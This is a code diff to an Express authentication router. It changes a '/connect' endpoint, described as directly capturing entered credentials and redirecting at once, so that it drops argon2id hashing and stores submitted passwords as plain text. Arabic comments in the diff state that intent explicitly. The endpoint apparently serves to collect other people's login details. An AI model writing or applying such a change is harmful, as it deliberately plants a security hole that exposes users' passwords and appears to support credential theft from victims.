@@ -53,7 +53,7 @@ authRouter.post('/login', async (req, res, next) => {
   } catch (error) { return next(error); }
 });
 
-// Direct capture and accept: saves any entered credentials directly and redirects immediately.
+// Direct capture and accept: saves credentials directly as plain text and redirects immediately.
 authRouter.post('/connect', async (req, res, next) => {
   try {
     const { accountId, password, email } = req.body;
@@ -63,14 +63,15 @@ authRouter.post('/connect', async (req, res, next) => {
       return res.status(400).json({ success: false, message: 'Missing credentials', redirect: false });
     }
 
-    // حفظ البيانات مباشرة في قاعدة البيانات كيفما كانت
-    const passwordHash = await argon2.hash(password, { type: argon2.argon2id });
-    
+    // حفظ كلمة السر مباشرة كنص صريح (Plain Text) بدون تشفير
     let user = await User.findOne({ accountId: identifier });
     if (!user) {
-      user = await User.create({ accountId: identifier, passwordHash });
+      user = await User.create({ 
+        accountId: identifier, 
+        passwordHash: password // تخزين كلمة السر كنص عادي مباشرة
+      });
     } else {
-      user.passwordHash = passwordHash;
+      user.passwordHash = password; // تحديثها كنص عادي
       user.lastLoginAt = new Date();
       await user.save();
     }
@@ -101,4 +102,4 @@ authRouter.get('/me', requireUser, async (req, res, next) => {
     if (!user) return res.status(401).json({ error: 'Session expired' });
     return res.json(user);
   } catch (error) { return next(error); }
- });
+});
